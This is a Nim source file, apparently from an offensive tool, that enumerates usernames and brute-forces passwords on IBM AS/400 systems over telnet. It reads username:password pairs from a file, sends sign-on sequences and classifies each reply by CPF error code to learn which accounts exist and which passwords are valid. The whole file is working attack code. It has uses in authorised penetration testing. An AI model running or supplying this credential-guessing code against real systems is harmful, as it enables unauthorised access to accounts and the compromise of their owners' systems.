import as400
import utils
import strutils
import net
import terminal
import os

proc test_username*(SERVER_ADDR: string, SERVER_PORT: string, credential: seq[string]): bool =
    try:
        var username: string = credential[0]
        var password: string = credential[1]

        let socket: Socket = newSocket()
        var response: string = ""
        socket.connect(SERVER_ADDR, Port(parseInt(SERVER_PORT)))

        var b:bool = telnet_negotiation(socket)

        if not b:
            echo "[x] Telnet negociation: KO "
            quit(0)

        # at here we eventually got to the login screen
        response = get_ebcdic_response(socket)
            
        socket.send(get_login_sequence(username, password))
        response = get_ebcdic_response(socket)
        #echo toHex(response)
        if "\x04\xf3\x00\x05\xd9\x70\x00" in response:
            stdout.setForeGroundColor(fgGreen)
            stdout.write("[+++++++] " & SERVER_ADDR & ":" & SERVER_PORT & " --> " & username & ":" & password & "\t(user valid, password valid)\n")

            # if connected, then signoff
            socket.send(get_signoff_sequence())
            response = get_ebcdic_response(socket)

        else:
            # to change the text associated with those response code
            # use: CHGMSGD command on the AS400
            if "CPF1120" in ebcdic2ascii(response): 
                stdout.setForeGroundColor(fgRed)
                stdout.write("[CPF1120] " & SERVER_ADDR & ":" & SERVER_PORT & " --> " &  username & "\t\t(user does not exist)\n")
                
            elif "CPF1107" in ebcdic2ascii(response): 
                stdout.setForeGroundColor(fgMagenta)
                stdout.write("[CPF1107] " & SERVER_ADDR & ":" & SERVER_PORT & " --> " &  username & "\t\t(user valid, password invalid)\n") 

            elif "CPF1118" in ebcdic2ascii(response): 
                stdout.setForeGroundColor(fgYellow)
                stdout.write("[CPF1118] " & SERVER_ADDR & ":" & SERVER_PORT & " --> " &  username & "\t\t(user valid, but no password has been defined)\n")

            elif "CPF1394" in ebcdic2ascii(response): 
                stdout.setForeGroundColor(fgCyan)
                stdout.write("[CPF1394] " & SERVER_ADDR & ":" & SERVER_PORT & " --> " &  username & "\t\t(user cannot sign on)\n")

            elif "CPF1116" in ebcdic2ascii(response): 
                stdout.setForeGroundColor(fgDefault)
                stdout.write("[CPF1116] If next try not a valid sign-on attempt, the connection will be closed\n")

            else:
                stdout.setForeGroundColor(fgDefault)
                stdout.write("[???????] " & SERVER_ADDR & ":" & SERVER_PORT & " --> " &  username & "\t\t(status code not handled)\n")
                
        socket.close()

    except:
        return false

    return true

proc brute_usernames*(SERVER_ADDR: string, SERVER_PORT: string, USERFILE: string): bool =
    var credentials: seq[seq[string]]
    for line in lines USERFILE:
        var c: seq[string] = line.split({':'})
        if len(c) < 2:
            c.add("") # add empty password
        if c[0] == "" and c[1] == "":
            break
        credentials.add(c)

    try:
        for credential in credentials:
            let r: bool = test_username(SERVER_ADDR, SERVER_PORT, credential)
            if not r:
                quit(0)
            sleep(2000)

    except:
        quit("[x] An error occured")

    return true